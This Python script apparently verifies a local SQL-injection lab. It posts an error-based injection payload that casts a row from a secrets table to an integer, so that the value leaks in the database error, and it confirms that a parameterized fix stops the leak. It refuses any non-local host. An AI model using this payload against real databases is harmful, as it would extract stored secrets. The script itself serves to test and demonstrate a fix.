#!/usr/bin/env python3
"""Talk only to the local lab and check both the bug and the fix."""

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).resolve().parent))

from wrap import wrap

CANARY = "lab-canary-7f3a"
# Closes the quote the INSERT already opened, then forces a cast that fails.
PAYLOAD = "'||CAST((SELECT value FROM secrets LIMIT 1) AS integer)||'"
DEFAULT_BASE = "http://127.0.0.1:18080"


def assert_local(base):
    host = urlparse(base).hostname
    if host not in {"127.0.0.1", "localhost", "::1"}:
        sys.exit(f"This proof only talks to a local lab. Refusing {host!r}.")


def request_json(method, url, payload=None):
    data = None
    headers = {}
    if payload is not None:
        data = json.dumps(payload).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            body = response.read().decode()
            return response.status, json.loads(body) if body else {}
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode()
        try:
            parsed = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            parsed = {"raw": raw}
        return exc.code, parsed


def wait_until(base, mode):
    deadline = time.time() + 60
    last = "no response"
    while time.time() < deadline:
        try:
            status, body = request_json("GET", base + "/health")
            last = f"{status} {body}"
            if status == 200 and body.get("mode") == mode:
                return
        except Exception as exc:
            last = str(exc)
        time.sleep(0.5)
    sys.exit(f"Lab did not reach mode {mode!r}. Last reply: {last}")


def post_record(base, record):
    return request_json("POST", base + "/notes", {"record": record})


def main():
    parser = argparse.ArgumentParser(description="Prove the local lab.")
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument(
        "--expect-safe",
        action="store_true",
        help="Expect the parameterized route to store the record and hide the canary.",
    )
    args = parser.parse_args()
    assert_local(args.base)
    mode = "safe" if args.expect_safe else "vulnerable"
    wait_until(args.base, mode)

    status, body = post_record(args.base, "v1|00FF|nope")
    blob = json.dumps(body)
    if status != 400 or CANARY in blob:
        sys.exit(f"A record with the wrong length reached the query: {status} {body}")
    print("length gate: a mismatched record stops before the query")

    record = wrap(PAYLOAD)
    status, body = post_record(args.base, record)
    blob = json.dumps(body)
    if args.expect_safe:
        if status != 201 or CANARY in blob:
            sys.exit(f"Fixed mode still exposed the canary: {status} {body}")
        print("fixed mode: the same record is stored as text and the canary stays in the table")
        return

    detail = body.get("detail") or ""
    if status != 500 or CANARY not in detail:
        sys.exit(f"Vulnerable mode did not return the canary in the database error: {status} {body}")
    print(f"vulnerable mode: database error contains {CANARY}")


if __name__ == "__main__":
    main()
